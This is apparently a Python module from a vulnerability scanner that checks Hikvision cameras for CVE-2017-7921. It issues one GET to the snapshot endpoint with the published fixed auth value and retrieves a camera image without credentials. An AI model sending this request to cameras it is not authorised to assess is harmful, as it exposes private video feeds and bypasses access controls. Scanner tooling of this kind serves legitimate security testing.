"""CVE-2017-7921: the Hikvision snapshot that answers without credentials.

The proof is one GET of the snapshot endpoint with the fixed `auth` value the
advisory publishes. Nothing is written to the device, and the answer is the frame
itself, which is why this class is the one of the batch that yields a picture.
"""

from models.finding import CveClass
from scanners.cve.base import CveTarget, ImageAttempt, ReadMethod, ReadRequest

# base64 of "admin:11\n", the value the advisory names. It is data, not a guess:
# the bypass is that the device accepts it from anyone.
_FIXED_AUTH = "YWRtaW46MTEK"
_SNAPSHOT_PATH = "/onvif-http/snapshot"


class HikvisionAuthBypass(ImageAttempt):
    """The Hikvision authentication bypass (CVE-2017-7921)."""

    @property
    def cve_ids(self) -> tuple[str, ...]:
        return ("CVE-2017-7921",)

    @property
    def cve_class(self) -> CveClass:
        return CveClass.auth_bypass

    def _requests_for(self, target: CveTarget, port: int) -> tuple[ReadRequest, ...]:
        return (
            ReadRequest(
                method=ReadMethod.get,
                url=target.url(port, f"{_SNAPSHOT_PATH}?auth={_FIXED_AUTH}"),
            ),
        )
